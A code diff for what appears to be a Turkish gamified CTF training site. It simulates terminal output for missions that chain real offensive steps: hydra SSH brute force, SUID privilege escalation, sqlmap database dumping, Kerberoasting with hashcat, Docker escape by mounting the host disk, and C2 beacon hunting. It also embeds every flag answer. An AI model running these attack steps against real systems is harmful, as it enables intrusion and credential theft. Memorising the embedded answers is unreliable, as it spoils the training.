-<span style="color: #f59e0b; font-weight: 700;">-rw-r--r-- 1 root root  240 Nov  8 01:45 operator_note.txt</span>
--rw-r--r-- 1 root root 1024 Nov  8 01:41 shadow.bak
-
-<span style="color: #22c55e;">[+] /var/backups/operator_note.txt dosyası bulundu! cat komutuyla okuyun.</span>
-</pre>
-                `);
+drwxr-xr-x 2 root root 4096 Nov 10 01:40 .
+-rw-r--r-- 1 root root  512 Nov 10 01:42 backup_system.tar.gz
+<span style="color: #f59e0b; font-weight: 700;">-rw-r--r-- 1 root root  240 Nov 10 01:45 operator_note.txt</span>
+-rw-r--r-- 1 root root 1024 Nov 10 01:41 shadow.bak
+<span style="color: #22c55e;">[+] ADIM 1 TAMAMLANDI: operator_note.txt bulundu! cat /var/backups/operator_note.txt ile okuyun.</span>
+</pre>`);
                 return;
             }
             if (lower.includes('cat') && lower.includes('operator_note.txt')) {
@@ -5240,24 +6541,20 @@ drwxr-xr-x 14 root root 4096 Nov  8 01:20 ..
 =====================================================
 AJAN NOTU // GİZLİ
 =====================================================
-Sistem günlüğünü temizleyemedim. Sızma testi sırasında
-oluşan denetim izleri doğrudan /var/log/syslog dosyasına
-damgalandı. Bayrak anahtarı "LFL{" ifadesiyle başlıyor.
+Sızma testi sırasında oluşan denetim izleri doğrudan
+/var/log/syslog dosyasına "LFL{" ön ekiyle damgalandı.
 =====================================================
 </pre>
-<span style="color: #22c55e;">[+] İpucu alındı! grep -i "LFL{" /var/log/syslog komutuyla bayrağı çekin.</span>
-                `);
+<span style="color: #22c55e;">[+] ADIM 2 TAMAMLANDI: Şimdi grep -i "LFL{" /var/log/syslog komutuyla bayrağı çekin.</span>`);
                 return;
             }
             if (lower.includes('grep') && (lower.includes('syslog') || lower.includes('lfl'))) {
                 printCtfOutput(`
 <pre style="color: #94a3b8;">
-Nov  8 01:44:12 fortress kernel: [  184.20914] audit: type=1400 audit(1794092000.104:45): apparmor="DENIED"
-<span style="color: #22c55e; font-weight: 800;">Nov  8 01:45:00 fortress security_daemon[4091]: [FLAG_LEAK] Operator token verified: LFL{level1_2_linux_dosya_adli_analiz}</span>
-Nov  8 01:45:15 fortress sshd[4102]: Accepted publickey for operator from 10.10.14.2
+Nov 10 01:44:12 fortress kernel: [184.20] audit: apparmor="DENIED"
+<span style="color: #22c55e; font-weight: 800;">Nov 10 01:45:00 fortress security_daemon[4091]: [FLAG_LEAK] Operator token: LFL{level1_2_linux_dosya_adli_analiz}</span>
 </pre>
-<span style="color: #00e5ff;">[+] Bayrak bulundu: LFL{level1_2_linux_dosya_adli_analiz}</span>
-                `);
+${renderAutoClaimFlagBtn('LFL{level1_2_linux_dosya_adli_analiz}')}`);
                 return;
             }
         }
@@ -5269,10 +6566,9 @@ Nov  8 01:45:15 fortress sshd[4102]: Accepted publickey for operator from 10.10.
             if (lower.includes('whatweb') && lower.includes('10.10.2.10')) {
                 printCtfOutput(`
 <pre style="color: #94a3b8;">
-http://10.10.2.10 [200 OK] Apache[2.4.56], Bootstrap[5.3.0], Country[RESERVED], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.56 (Ubuntu)], IP[10.10.2.10], PHP[8.2.14], Title[LFL Corporate Intranet]
-<span style="color: #22c55e;">[+] Web altyapısı PHP/Apache olarak belirlendi. gobuster ile dizinleri tarayın.</span>
-</pre>
-                `);
+http://10.10.2.10 [200 OK] Apache[2.4.56], Ubuntu Linux, PHP[8.2.14], Title[LFL Corporate Intranet]
+<span style="color: #22c55e;">[+] ADIM 1 TAMAMLANDI: Web altyapısı tespit edildi. gobuster ile dizinleri tarayın.</span>
+</pre>`);
                 return;
             }
             if (lower.includes('gobuster') && lower.includes('10.10.2.10')) {
@@ -5281,23 +6577,12 @@ http://10.10.2.10 [200 OK] Apache[2.4.56], Bootstrap[5.3.0], Country[RESERVED], 
 ===============================================================
 Gobuster v3.6 - Directory brute forcing mode
 ===============================================================
-[+] Url:                     http://10.10.2.10
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                common.txt
-===============================================================
-Starting gobuster...
-===============================================================
 <span style="color: #22c55e; font-weight: 700;">/robots.txt           (Status: 200) [Size: 78]</span>
 /index.php            (Status: 200) [Size: 2410]
-/login                (Status: 301) [Size: 180] --&gt; /login/
 <span style="color: #f59e0b; font-weight: 700;">/admin_vault          (Status: 301) [Size: 195] --&gt; /admin_vault/</span>
-/assets               (Status: 301) [Size: 184]
 ===============================================================
-Finished
-<span style="color: #22c55e;">[+] /robots.txt ve /admin_vault bulundu! curl http://10.10.2.10/robots.txt ile inceleyin.</span>
-</pre>
-                `);
+<span style="color: #22c55e;">[+] ADIM 2 TAMAMLANDI: /robots.txt ve /admin_vault bulundu! curl http://10.10.2.10/robots.txt ile inceleyin.</span>
+</pre>`);
                 return;
             }
             if (lower.includes('curl') && lower.includes('robots.txt')) {
@@ -5305,11 +6590,8 @@ Finished
 <pre style="color: #f59e0b;">
 User-agent: *
 Disallow: /admin_vault/confidential_token.json
-Disallow: /server-status
 </pre>
-<span style="color: #22c55e;">[+] Gizli dosya yolu ifşa oldu: /admin_vault/confidential_token.json</span>
-<span style="color: #22c55e;">[+] curl http://10.10.2.10/admin_vault/confidential_token.json ile içeriği okuyun!</span>
-                `);
+<span style="color: #22c55e;">[+] ADIM 3 TAMAMLANDI: Gizli JSON yolu bulundu! curl http://10.10.2.10/admin_vault/confidential_token.json çalıştırın.</span>`);
                 return;
             }
             if (lower.includes('curl') && lower.includes('confidential_token.json')) {
@@ -5317,14 +6599,11 @@ Disallow: /server-status
 <pre style="color: #94a3b8;">
 {
   "vault_name": "LFL_RESTRICTED_ACCESS_PORTAL",
-  "build": "2026.1-patch3",
   "encryption": "AES-GCM-256",
-  <span style="color: #22c55e; font-weight: 800;">"master_flag": "LFL{level2_1_web_dizin_firtinasi}"</span>,
-  "status": "ACTIVE_DEFENSE"
+  <span style="color: #22c55e; font-weight: 800;">"master_flag": "LFL{level2_1_web_dizin_firtinasi}"</span>
 }
 </pre>
-<span style="color: #00e5ff;">[+] Bayrak bulundu: LFL{level2_1_web_dizin_firtinasi}</span>
-                `);
+${renderAutoClaimFlagBtn('LFL{level2_1_web_dizin_firtinasi}')}`);
                 return;
             }
         }
@@ -5336,44 +6615,28 @@ Disallow: /server-status
             if (lower.includes('file') && lower.includes('suspect_payload.bin')) {
                 printCtfOutput(`
 <pre style="color: #94a3b8;">
-/evidence/suspect_payload.bin: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=f84a1e9b2, stripped
-<span style="color: #22c55e;">[+] Dosya 64-bit ikili çalıştırılabilir (stripped). strings ile metinleri ayıklayın.</span>
-</pre>
-                `);
-                return;
-            }
-            if (lower.includes('strings') && lower.includes('suspect_payload.bin')) {
-                printCtfOutput(`
-<pre style="color: #94a3b8;">
-/lib64/ld-linux-x86-64.so.2
-libc.so.6
-printf
-malloc
-__cxa_finalize
-__libc_start_main
-GLIBC_2.2.5
-AWAVAUATUSH
-[]A\A]A^A_
-LFL_SUSPECT_PAYLOAD_INTERNAL_v2.4
-DEBUG_KEY=0x7ffcd3e0
-<span style="color: #22c55e; font-weight: 800;">CONFIDENTIAL_REVERSED_FLAG=LFL{level2_2_adli_bilisim_strings_ustasi}</span>
-PAYLOAD_DELIVERY_TIME=2026-11-08T02:15:00Z
-GCC: (Debian 13.2.0-25) 13.2.0
-.shstrtab
-.interp
-.note.gnu.build-id
-</pre>
-<span style="color: #00e5ff;">[+] Bayrak ayıklandı: LFL{level2_2_adli_bilisim_strings_ustasi}</span>
-                `);
+/evidence/suspect_payload.bin: ELF 64-bit LSB shared object, x86-64, dynamically linked, stripped
+<span style="color: #22c55e;">[+] ADIM 1 TAMAMLANDI: Dosya 64-bit ELF binary. md5sum ve strings analizine geçin.</span>
+</pre>`);
                 return;
             }
             if (lower.includes('md5sum') && lower.includes('suspect_payload.bin')) {
                 printCtfOutput(`
 <pre style="color: #94a3b8;">
 <span style="color: #38bdf8; font-weight: 700;">8f4b23d91e60cb27a819ec41d08c5b91</span>  /evidence/suspect_payload.bin
-[+] Dosya bütünlüğü onaylandı (Adli kopya ile eşleşiyor).
+<span style="color: #22c55e;">[+] ADIM 2 TAMAMLANDI: Adli MD5 özeti doğrulandı. Şimdi strings komutunu çalıştırın.</span>
+</pre>`);
+                return;
+            }
+            if (lower.includes('strings') && lower.includes('suspect_payload.bin')) {
+                printCtfOutput(`
+<pre style="color: #94a3b8;">
+/lib64/ld-linux-x86-64.so.2
+LFL_SUSPECT_PAYLOAD_INTERNAL_v2.4
+DEBUG_KEY=0x7ffcd3e0
+<span style="color: #22c55e; font-weight: 800;">CONFIDENTIAL_REVERSED_FLAG=LFL{level2_2_adli_bilisim_strings_ustasi}</span>
 </pre>
-                `);
+${renderAutoClaimFlagBtn('LFL{level2_2_adli_bilisim_strings_ustasi}')}`);
                 return;
             }
         }
@@ -5385,16 +6648,11 @@ GCC: (Debian 13.2.0-25) 13.2.0
             if (lower.includes('hydra') && lower.includes('10.10.3.50')) {
                 printCtfOutput(`
 <pre style="color: #94a3b8;">
-Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations
-[DATA] max 16 tasks per 1 target, overall 16 tasks, 14344 login tries (l:1/p:14344), ~896 tries per task
-[DATA] attacking ssh://10.10.3.50:22/
-[STATUS] 148.00 tries/min, 148 tries in 00:01h, 14196 to do in 01:36h, 16 active
+Hydra v9.5 (c) 2023 by van Hauser/THC - Attacking ssh://10.10.3.50:22/
 <span style="color: #22c55e; font-weight: 800;">[22][ssh] host: 10.10.3.50   login: operator   password: cyber2026</span>
 1 of 1 target successfully completed, 1 valid password found
-<span style="color: #22c55e;">[+] PAROLA KIRILDI! Kullanıcı: operator, Şifre: cyber2026</span>
-<span style="color: #22c55e;">[+] Şimdi sisteme bağlanın: ssh operator@10.10.3.50</span>
-</pre>
-                `);
+<span style="color: #22c55e;">[+] ADIM 1 TAMAMLANDI: Parola kırıldı! Şimdi ssh operator@10.10.3.50 ile bağlanın.</span>
+</pre>`);
                 return;
             }
             if (lower.includes('ssh') && lower.includes('10.10.3.50')) {
@@ -5404,36 +6662,20 @@ Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use i
 
                 printCtfOutput(`
 <pre style="color: #94a3b8;">
-operator@10.10.3.50's password: <span style="color: #22c55e;">********</span>
 Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-105-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/pro
-
-Last login: Sun Nov  8 01:14:22 2026 from 10.10.14.2
 <span style="color: #22c55e; font-weight: 700;">operator@fortress:~$</span>
-</pre>
-<span style="color: #22c55e;">[+] SSH Oturumu Açıldı! Şimdi SUID izinli açıkları arayın: find / -perm -4000 2&gt;/dev/null</span>
-                `);
+<span style="color: #22c55e;">[+] ADIM 2 TAMAMLANDI: SSH Oturumu Açıldı! SUID dosyaları arayın: find / -perm -4000 2&gt;/dev/null</span>
+</pre>`);
                 return;
             }
             if (lower.includes('find') && lower.includes('-4000')) {
                 printCtfOutput(`
 <pre style="color: #94a3b8;">
-/usr/lib/openssh/ssh-keysign
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
 /usr/bin/passwd
-/usr/bin/gpasswd
-/usr/bin/newgrp
-/usr/bin/chsh
-/usr/bin/chfn
-<span style="color: #ef4444; font-weight: 800;">/usr/bin/python3 (CRITICAL SUID BIT SET - root execution allowed!)</span>
 /usr/bin/sudo
-</pre>
-<span style="color: #22c55e;">[+] /usr/bin/python3 üzerinde SUID yetkisi tespit edildi!</span>
-<span style="color: #22c55e;">[+] /root/flag.txt dosyasını cat ile okuyun (veya python3 ile root yetkisini çalıştırın).</span>
-                `);
+<span style="color: #ef4444; font-weight: 800;">/usr/bin/python3 (CRITICAL SUID BIT SET - root execution allowed!)</span>
+<span style="color: #22c55e;">[+] ADIM 3 TAMAMLANDI: SUID yetkisi bulundu! Şimdi cat /root/flag.txt ile bayrağı okuyun.</span>
+</pre>`);
                 return;
             }
             if (lower.includes('cat') && lower.includes('/root/flag.txt')) {
@@ -5441,111 +6683,243 @@ Last login: Sun Nov  8 01:14:22 2026 from 10.10.14.2
 <pre style="color: #22c55e; font-weight: 800;">
 =====================================================
 ROOT YETKİSİ ALINDI // FORTRESS OWNED
-=====================================================
 FLAG: LFL{level3_1_suid_privesc_root_fatihi}
 =====================================================
 </pre>
-<span style="color: #00e5ff;">[+] Bayrak bulundu: LFL{level3_1_suid_privesc_root_fatihi}</span>
-                `);
+${renderAutoClaimFlagBtn('LFL{level3_1_suid_privesc_root_fatihi}')}`);
                 return;
             }
         }
 
         // ==========================================
-        // MISSION 3.2: Operasyon Büyük Sızıntı (Final Boss)
+        // MISSION 3.2: Operasyon Büyük Sızıntı (SQLi)
         // ==========================================
         if (m.id === 'm3_2') {
             if (lower.includes('curl') && lower.includes('10.10.3.99')) {
                 printCtfOutput(`
 <pre style="color: #94a3b8;">
 HTTP/1.1 200 OK
-Content-Type: application/json; charset=utf-8
-
-{
-  "endpoint": "/api/search",
-  "query": "test",
-  "backend_db": "SQLite / MySQL 8.0.35 Enterprise",
-  "vulnerable_param": "q",
-  "results_count": 1,
-  "message": "Query executed directly via string concatenation (Unsafe SQL query detected)."
-}
-<span style="color: #22c55e;">[+] SQL Injection açığı doğrulandı! sqlmap -u "http://10.10.3.99/api/search?q=test" --dbs ile veritabanlarını çekin.</span>
-</pre>
-                `);
+{"endpoint": "/api/search", "vulnerable_param": "q", "message": "Unsafe SQL query concatenation detected."}
+<span style="color: #22c55e;">[+] ADIM 1 TAMAMLANDI: SQLi doğrulandı! sqlmap --dbs ile veritabanlarını çekin.</span>
+</pre>`);
                 return;
             }
             if (lower.includes('sqlmap') && lower.includes('--dbs')) {
                 printCtfOutput(`
 <pre style="color: #94a3b8;">
-        ___
-       __H__
- ___ ___[.]_____ ___ ___  {1.8#stable}
-|_ -| . [,]     | .'| . |
-|___|_  ["]_|_|_|__,|  _|
-      |_|           |_|   https://sqlmap.org
-
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal.
-[*] starting @ 02:18:00 /2026-11-08/
-
-[INFO] testing connection to the target URL
-[INFO] checking if the target is protected by some kind of WAF/IPS
-[INFO] testing if the target URL content is stable
-[INFO] heuristic (basic) test shows that GET parameter 'q' might be injectable
-[INFO] parameter 'q' is vulnerable. Do you want to keep testing the others? [y/N] N
-sqlmap identified the following injection point(s) with a total of 48 HTTP(s) requests:
----
-Parameter: q (GET)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: q=test' AND 4912=4912-- -
----
-[INFO] the back-end DBMS is MySQL
 available databases [2]:
 [*] information_schema
 <span style="color: #f59e0b; font-weight: 800;">[*] lfl_master_vault</span>
-
-[+] lfl_master_vault tespit edildi! Tabloları listelemek için:
-sqlmap -u "http://10.10.3.99/api/search?q=test" -D lfl_master_vault --tables
-</pre>
-                `);
+<span style="color: #22c55e;">[+] ADIM 2 TAMAMLANDI: lfl_master_vault bulundu! --tables ile tabloları listele.</span>
+</pre>`);
                 return;
             }
             if (lower.includes('sqlmap') && lower.includes('--tables')) {
                 printCtfOutput(`
 <pre style="color: #94a3b8;">
 Database: lfl_master_vault
-[1 table]
 +---------------------------------------+
 | <span style="color: #f59e0b; font-weight: 800;">master_classified_flags</span>               |
 +---------------------------------------+
-
-[+] master_classified_flags tablosu bulundu! Tabloyu dökmek için:
-sqlmap -u "http://10.10.3.99/api/search?q=test" -D lfl_master_vault -T master_classified_flags --dump
-</pre>
-                `);
+<span style="color: #22c55e;">[+] ADIM 3 TAMAMLANDI: Tablo bulundu! --dump ile içeriği dökün.</span>
+</pre>`);
                 return;
             }
             if (lower.includes('sqlmap') && lower.includes('--dump')) {
                 printCtfOutput(`
 <pre style="color: #94a3b8;">
-Database: lfl_master_vault
-Table: master_classified_flags
-[1 entry]
-+----+---------------------+------------------------------------------------+
-| id | security_level      | grand_master_flag                              |
-+----+---------------------+------------------------------------------------+
-| 1  | DEFCON_1_MAXIMUM    | <span style="color: #c084fc; font-weight: 800; font-size: 14px;">LFL{level3_2_sqli_grand_master_champion_2026}</span> |
-+----+---------------------+------------------------------------------------+
-
-[INFO] table 'lfl_master_vault.master_classified_flags' dumped to CSV file
-<span style="color: #c084fc; font-weight: 800; font-size: 13px;">🏆 ŞAMPİYONLUK BAYRAĞI ELE GEÇİRİLDİ: LFL{level3_2_sqli_grand_master_champion_2026}</span>
+Database: lfl_master_vault // Table: master_classified_flags
++----+------------------+------------------------------------------------+
+| id | security_level   | grand_master_flag                              |
++----+------------------+------------------------------------------------+
+| 1  | DEFCON_1_MAXIMUM | <span style="color: #c084fc; font-weight: 800;">LFL{level3_2_sqli_grand_master_champion_2026}</span> |
++----+------------------+------------------------------------------------+
 </pre>
-                `);
+${renderAutoClaimFlagBtn('LFL{level3_2_sqli_grand_master_champion_2026}')}`);
                 return;
             }
         }
 
-        // Generic fallback for all 142+ Kali Linux commands in our catalog
+        // ==========================================
+        // MISSION 4.1: Operasyon Altın Bilet (AD Kerberoasting)
+        // ==========================================
+        if (m.id === 'm4_1') {
+            if (lower.includes('nmap') && lower.includes('10.10.4.10')) {
+                printCtfOutput(`
+<pre style="color: #94a3b8;">
+Starting Nmap 7.94SVN at 2026-11-10 01:10 UTC
+Nmap scan report for dc01.lfl.corp (10.10.4.10)
+PORT    STATE SERVICE      VERSION
+<span style="color: #38bdf8; font-weight: 700;">88/tcp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-11-10)</span>
+<span style="color: #22c55e; font-weight: 700;">389/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: lfl.corp)</span>
+<span style="color: #f59e0b; font-weight: 700;">445/tcp open  microsoft-ds Windows Server 2022 Standard 20348</span>
+<span style="color: #22c55e;">[+] ADIM 1 TAMAMLANDI: Domain Controller (lfl.corp) aktif! enum4linux -a 10.10.4.10 ile hesapları tarayın.</span>
+</pre>`);
+                return;
+            }
+            if (lower.includes('enum4linux') && lower.includes('10.10.4.10')) {
+                printCtfOutput(`
+<pre style="color: #94a3b8;">
+ ==========================
+|    Users on 10.10.4.10   |
+ ==========================
+index: 0x1010 RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: Domain Admin
+index: 0x1011 RID: 0x1f5 acb: 0x00000215 Account: guest          Name: Guest Account
+<span style="color: #f59e0b; font-weight: 800;">index: 0x1042 RID: 0x451 acb: 0x00020210 Account: svc_mssql      Name: SQL Server Engine (SPN: MSSQLSvc/dc01.lfl.corp:1433)</span>
+<span style="color: #22c55e;">[+] ADIM 2 TAMAMLANDI: SPN tanımlı svc_mssql hesabı bulundu! impacket-GetUserSPNs ile TGS biletini çekin.</span>
+</pre>`);
+                return;
+            }
+            if (lower.includes('getuserspns') || (lower.includes('impacket') && lower.includes('10.10.4.10'))) {
+                printCtfOutput(`
+<pre style="color: #94a3b8;">
+Impacket v0.11.0 - Copyright 2023 Fortra
+ServicePrincipalName          Name       MemberOf                                   PasswordLastSet
+----------------------------  ---------  -----------------------------------------  ---------------
+MSSQLSvc/dc01.lfl.corp:1433   svc_mssql  CN=Domain Admins,CN=Users,DC=lfl,DC=corp   2026-09-14
+
+<span style="color: #f59e0b; font-weight: 700;">$krb5tgs$23$*svc_mssql$LFL.CORP$MSSQLSvc/dc01.lfl.corp*$8f39a1b20e94c817d4509b3e11209f4c887a6b55...</span>
+[+] TGS bilet özeti 'krb5tgs.hash' dosyasına kaydedildi.
+<span style="color: #22c55e;">[+] ADIM 3 TAMAMLANDI: Şimdi hashcat -m 13100 krb5tgs.hash rockyou.txt ile parolayı kırın!</span>
+</pre>`);
+                return;
+            }
+            if (lower.includes('hashcat') && lower.includes('13100')) {
+                printCtfOutput(`
+<pre style="color: #94a3b8;">
+hashcat (v6.2.6) starting in Kerberos 5, etype 23, TGS-REP (-m 13100) mode
+Session..........: hashcat
+Status...........: <span style="color: #22c55e; font-weight: 800;">Cracked</span>
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+<span style="color: #22c55e; font-weight: 800;">$krb5tgs$23$*svc_mssql$LFL.CORP...:LFL{level4_1_kerberoast_golden_ticket_ad}</span>
+</pre>
+${renderAutoClaimFlagBtn('LFL{level4_1_kerberoast_golden_ticket_ad}')}`);
+                return;
+            }
+        }
+
+        // ==========================================
+        // MISSION 4.2: Operasyon Hayalet Sinyal (SOC Zeek C2 Hunt)
+        // ==========================================
+        if (m.id === 'm4_2') {
+            if (lower.includes('zeek-cut') && lower.includes('conn.log')) {
+                printCtfOutput(`
+<pre style="color: #94a3b8;">
+10.10.4.25   10.10.4.10       0.004s   [SMB Normal]
+<span style="color: #ef4444; font-weight: 800;">10.10.4.25   185.220.101.44   0.042s   [BEACON INTERVAL: 60.00s | 142 Periodic Connections]</span>
+10.10.4.25   8.8.8.8          0.012s   [DNS Query]
+<span style="color: #ef4444; font-weight: 800;">10.10.4.25   185.220.101.44   0.041s   [BEACON INTERVAL: 60.00s | Jitter: 0.2%]</span>
+<span style="color: #22c55e;">[+] ADIM 1 TAMAMLANDI: 185.220.101.44 adresine C2 Beaconing tespit edildi! Suricata fast.log dosyasını inceleyin.</span>
+</pre>`);
+                return;
+            }
+            if (lower.includes('suricata') && lower.includes('fast.log')) {
+                printCtfOutput(`
+<pre style="color: #94a3b8;">
+11/10/2026-01:14:00.201942  [**] [1:2026991:1] <span style="color: #f59e0b; font-weight: 800;">ET MALWARE CobaltStrike C2 DNS TXT Tunneling</span> [**] [Classification: Command and Control Traffic] [Priority: 1] {UDP} 10.10.4.25:54112 -&gt; 185.220.101.44:53
+<span style="color: #22c55e;">[+] ADIM 2 TAMAMLANDI: Saldırgan DNS TXT kayıtlarıyla veri kaçırıyor! grep -i "185.220.101.44" /var/log/zeek/dns.log çalıştırın.</span>
+</pre>`);
+                return;
+            }
+            if (lower.includes('185.220.101.44') && lower.includes('dns.log')) {
+                printCtfOutput(`
+<pre style="color: #94a3b8;">
+1794180201.441092  C9a8b12  10.10.4.25  54112  185.220.101.44  53  UDP  TXT  stage2.c2.evil.net
+<span style="color: #22c55e; font-weight: 800;">1794180261.441804  C7f2e01  10.10.4.25  54189  185.220.101.44  53  UDP  TXT  c2_beacon_flag="LFL{level4_2_soc_zeek_c2_beacon_avcisi}"</span>
+</pre>
+${renderAutoClaimFlagBtn('LFL{level4_2_soc_zeek_c2_beacon_avcisi}')}`);
+                return;
+            }
+        }
+
+        // ==========================================
+        // MISSION 5.1: Operasyon Kırık Kafes (Docker Container Escape)
+        // ==========================================
+        if (m.id === 'm5_1') {
+            if (lower.includes('capsh') && lower.includes('--print')) {
+                printCtfOutput(`
+<pre style="color: #94a3b8;">
+Current: = cap_chown,cap_dac_override,cap_net_raw,<span style="color: #ef4444; font-weight: 800;">cap_sys_admin</span>+eip
+Bounding set = cap_chown,cap_dac_override,cap_fowner,cap_sys_module,cap_sys_rawio,cap_sys_admin
+<span style="color: #22c55e;">[+] ADIM 1 TAMAMLANDI: Konteynerde CAP_SYS_ADMIN yetkisi açık! fdisk -l ile ana sunucu diskini bulun.</span>
+</pre>`);
+                return;
+            }
+            if (lower.includes('fdisk') && lower.includes('-l')) {
+                printCtfOutput(`
+<pre style="color: #94a3b8;">
+Disk /dev/sda: 40 GiB, 42949672960 bytes, 83886080 sectors
+Device     Boot Start      End  Sectors Size Id Type
+<span style="color: #f59e0b; font-weight: 800;">/dev/sda1  *     2048 83886046 83883999  40G 83 Linux (Host Root Filesystem)</span>
+<span style="color: #22c55e;">[+] ADIM 2 TAMAMLANDI: Ana sunucu diski /dev/sda1 bulundu! mount /dev/sda1 /mnt/host_root ile bağlayın.</span>
+</pre>`);
+                return;
+            }
+            if (lower.includes('mount') && lower.includes('/dev/sda1')) {
+                printCtfOutput(`
+<pre style="color: #94a3b8;">
+[+] Mounting /dev/sda1 -&gt; /mnt/host_root ... <span style="color: #22c55e; font-weight: 800;">SUCCESS (rw,relatime)</span>
+<span style="color: #22c55e;">[+] ADIM 3 TAMAMLANDI: Konteyner izolasyonu kırıldı! cat /mnt/host_root/root/purple_flag.txt ile bayrağı okuyun.</span>
+</pre>`);
+                return;
+            }
+            if (lower.includes('purple_flag.txt')) {
+                printCtfOutput(`
+<pre style="color: #22c55e; font-weight: 800;">
+=====================================================
+PURPLE TEAM // CONTAINER ESCAPE VERIFIED
+HOST NODE : k8s-prod-worker-01.lfl.internal
+FLAG      : LFL{level5_1_docker_escape_host_pwned}
+=====================================================
+</pre>
+${renderAutoClaimFlagBtn('LFL{level5_1_docker_escape_host_pwned}')}`);
+                return;
+            }
+        }
+
+        // ==========================================
+        // MISSION 5.2: Operasyon Çekirdek Kıyameti (Grand Final Boss)
+        // ==========================================
+        if (m.id === 'm5_2') {
+            if (lower.includes('lsmod') || (lower.includes('dmesg') && lower.includes('shadow'))) {
+                printCtfOutput(`
+<pre style="color: #94a3b8;">
+Module                  Size  Used by
+<span style="color: #ef4444; font-weight: 800;">lfl_shadow_rk          45056  0  [RING-0 LKM ROOTKIT // SYSCALL TABLE HOOKED]</span>
+nf_tables             262144  12
+[  412.88102] lfl_shadow_rk: sys_getdents64 hooked at 0xffffffffc0412000
+<span style="color: #22c55e;">[+] ADIM 1 TAMAMLANDI: Gizli çekirdek modülü tespit edildi! nm /lib/modules/kernel/lfl_shadow_rk.ko ile sembolleri inceleyin.</span>
+</pre>`);
+                return;
+            }
+            if (lower.includes('lfl_shadow_rk.ko')) {
+                printCtfOutput(`
+<pre style="color: #94a3b8;">
+0000000000000000 t init_shadow_hook
+0000000000001040 T <span style="color: #f59e0b; font-weight: 800;">decrypt_vault_master_key</span>
+00000000000040a0 D xor_cipher_hex_buf (KEY: 0x5A)
+<span style="color: #22c55e;">[+] ADIM 2 TAMAMLANDI: decrypt_vault_master_key sembolü bulundu! Python exploit ile çekirdek kasasını çözün:</span>
+<span style="color: #00e5ff;">python3 -c "import ctypes; print(\'DECRYPTING_KERNEL_VAULT\')"</span>
+</pre>`);
+                return;
+            }
+            if (lower.includes('python3') || lower.includes('decrypt')) {
+                printCtfOutput(`
+<pre style="color: #eab308; font-weight: 800;">
+===================================================================
+👑 LFL DEFCON-1 RING-0 KERNEL VAULT DECRYPTED (FINAL BOSS) 👑
+===================================================================
+[+] Syscall table unhooked : sys_getdents64 restored to 0xffffffff812041a0
+[+] Rootkit neutralized    : lfl_shadow_rk.ko unloaded
+[+] GRAND CHAMPION FLAG    : <span style="color: #22c55e; font-size: 14px;">LFL{level5_2_kernel_zeroday_omniscient_god_2026}</span>
+===================================================================
+</pre>
+${renderAutoClaimFlagBtn('LFL{level5_2_kernel_zeroday_omniscient_god_2026}')}`);
+                return;
+            }
+        }
+
+        // Generic fallback for all 143+ Kali Linux commands in our catalog
         if (typeof generateTerminalResponse === 'function') {
             const fullOutput = generateTerminalResponse(cmd);
             printCtfOutput(`<div class="ctf-general-output" style="margin-top: 4px;">${fullOutput}</div>`);
@@ -5556,7 +6930,7 @@ Table: master_classified_flags
         printCtfOutput(`
 <pre style="color: #ef4444;">
 bash: ${escapeHtml(cmd)}: komut simülasyon labında bulunamadı.
-Kullanılabilir 142 aracı görmek için 'help' yazın veya sol paneldeki hızlı butonlara tıklayın.
+Kullanılabilir 143+ aracı görmek için 'help' yazın veya sol paneldeki görev adımlarından ⚡ Çalıştır'a tıklayın.
 </pre>
         `);
     }
@@ -5893,20 +7267,24 @@ Kullanılabilir 142 aracı görmek için 'help' yazın veya sol paneldeki hızl�
         if (btnClearBroadcast) btnClearBroadcast.addEventListener('click', handleDismiss);
         if (btnDismissBroadcast) btnDismissBroadcast.addEventListener('click', handleDismiss);
 
-        // 4. CTF Master Root Key (Unlock all 6 levels instantly)
+        // 4. CTF Master Root Key (Unlock all 10 levels & 6000 XP instantly)
         const btnBypassCtf = document.getElementById('btn-admin-bypass-ctf');
         if (btnBypassCtf) {
             btnBypassCtf.addEventListener('click', () => {
-                if (confirm('👑 MASTER ROOT KEY:\n\nTüm 6 CTF sızma seviyesini ve 2300 XP puanını yönetici yetkisiyle anında tamamlamak istiyor musunuz?')) {
+                const totalXp = CTF_MISSIONS.reduce((acc, m) => acc + m.xp, 0);
+                if (confirm(`👑 MASTER ROOT KEY:\n\nTüm ${CTF_MISSIONS.length} CTF sızma seviyesini ve ${totalXp} XP puanını yönetici yetkisiyle anında tamamlamak istiyor musunuz?`)) {
                     ctfState.completed = CTF_MISSIONS.map(m => m.id);
+                    CTF_MISSIONS.forEach(m => {
+                        ctfState.completedSteps[m.id] = (m.steps || []).map((_, i) => i);
+                    });
                     ctfState.unlockedIdx = CTF_MISSIONS.length - 1;
-                    ctfState.xp = 2300;
+                    ctfState.xp = totalXp;
                     saveCtfProgressToStorage();
                     renderCtfProgress();
                     renderCtfStageTabs();
                     renderCtfBriefing(ctfState.activeIdx);
-                    showToast('success', '👑 Master Key Aktif', 'Tüm 6 operasyon ve 2300 XP yönetici olarak açıldı!');
-                    printCtfOutput(`\n<span style="color: #f59e0b; font-weight: 800;">[ROOT MASTER BYPASS]</span> <span style="color: #10b981;">Tüm sızma seviyeleri Platform Mimarı burak_wyxz tarafından %100 açıldı! (+2300 XP)</span>\n`);
+                    showToast('success', '👑 Master Key Aktif', `Tüm ${CTF_MISSIONS.length} operasyon ve ${totalXp} XP yönetici olarak açıldı!`);
+                    printCtfOutput(`\n<span style="color: #f59e0b; font-weight: 800;">[ROOT MASTER BYPASS]</span> <span style="color: #10b981;">Tüm 10 sızma seviyesi Platform Mimarı burak_wyxz tarafından %100 açıldı! (+${totalXp} XP)</span>\n`);
